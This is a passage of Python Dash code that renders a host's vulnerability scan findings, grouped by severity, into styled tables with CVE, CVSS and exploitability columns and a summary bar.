        _TH_F = lambda t: html.Th(t, style={
            "color": color, "fontSize": "10px", "fontWeight": "700",
            "textTransform": "uppercase", "padding": "6px 8px",
            "borderBottom": f"1px solid {color}33", "background": "#0a0e14",
        })

        finding_sections.append(html.Div([
            html.Div([
                html.Span(f"▸ {sev}", style={
                    "fontWeight": "800", "color": color, "fontSize": "13px"}),
                html.Span(f"  {len(items)} finding{'s' if len(items)!=1 else ''}",
                    style={"color": "#555", "fontSize": "11px", "marginLeft": "8px"}),
            ], style={"marginBottom": "6px", "borderBottom": f"1px solid {color}33",
                      "paddingBottom": "4px"}),
            html.Table([
                html.Thead(html.Tr([
                    _TH_F("Finding"), _TH_F("CVE"), _TH_F("CVSS"),
                    _TH_F("Source"), _TH_F("Exploitable"), _TH_F("Description"),
                ])),
                html.Tbody(f_rows),
            ], style={"width": "100%", "borderCollapse": "collapse",
                      "fontSize": "12px"}),
        ], style={"marginBottom": "14px"}))

    # Summary
    total = len(findings)
    summary = html.Div([
        html.Span(f"🔍 {total} findings  ·  {len(services)} services", style={
            "fontWeight": "700", "fontSize": "13px", "color": "#e0e0e0"}),
        html.Div([
            html.Span(f"● {sev} {len(categorized[sev])}", style={
                "color": SEV_CLR[sev], "fontSize": "11px", "fontWeight": "600",
            }) for sev in SEV_ORDER if categorized[sev]
        ], style={"display": "flex", "gap": "14px", "marginTop": "4px"}),
    ], style={"background": "#161b22", "padding": "10px 14px",
              "borderRadius": "8px", "marginBottom": "14px"})

    return True, f"🖥️ {host_ip}", html.Div([summary, svc_section] + finding_sections)
